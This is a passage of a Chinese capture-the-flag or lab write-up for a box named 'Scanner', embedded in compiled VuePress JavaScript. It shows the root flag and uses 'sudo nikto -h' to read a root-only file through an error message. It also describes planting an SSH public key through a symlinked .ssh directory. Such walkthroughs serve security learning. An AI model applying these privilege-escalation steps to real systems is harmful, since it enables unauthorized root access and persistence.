"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/18.png",alt:""}})]),s._v(" "),a("p",[s._v("root：flag{root-74cc1c60799e0a786ac7094b532f01b1}")]),s._v(" "),a("p",[s._v("和出题人交流后发现nikto命令还可以通过-h报错读取文件内容")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/nikto "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" /root/root.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/19.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#最后"}},[s._v("#")]),s._v(" 最后")]),s._v(" "),a("p",[s._v("在打靶刚开始，扫描7天内变化的文件，发现了80端口的一些文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-type")]),s._v(" f "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-mtime")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-7")]),s._v(" \n/var/www/html/index.ng1nx-debian.html/info.php\n/var/www/html/index.ng1nx-debian.html/file.php\n/var/www/html/pass.txt\n/var/www/html/index.html\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("info.php是一个phpinfo，file.php是一个读取/opt目录下功能的文件，过滤了目录穿越，最后有一个文件包含，同时，这个80端口是root权限运行的nginx，没有利用到")]),s._v(" "),a("h2",{attrs:{id:"最后的最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#最后的最后"}},[s._v("#")]),s._v(" 最后的最后")]),s._v(" "),a("p",[s._v("ln,sd写入公钥的过程")]),s._v(" "),a("p",[s._v("现在来看，下面这几个文件也可以用来中转公钥")]),s._v(" "),a("ul",[a("li",[s._v(".bash_logout")]),s._v(" "),a("li",[s._v(".local")]),s._v(" "),a("li",[s._v(".profile")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/20.png",alt:""}})]),s._v(" "),a("p",[s._v("/home/welcome下存在.ssh的目录软连接，指向/home/welcome目录，同时/home/welcome目录下存在authorized_keys文件")]),s._v(" "),a("p",[s._v("那么写入逻辑应该是...")]),s._v(" "),a("p",[s._v("/home/welcome/.ssh/ > /home/welcome/")]),s._v(" "),a("p",[s._v("/home/welcome/.ssh/authorized_keys > /home/welcome/.bashrc")]),s._v(" "),a("p",[s._v("/home/welcome/.ssh/authorized_keys > /home/welcome/authorized_keys")]),s._v(" "),a("p",[s._v("无限套娃")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/21.png",alt:""}})])])}),[],!1,null,null,null);a.default=n.exports}}]);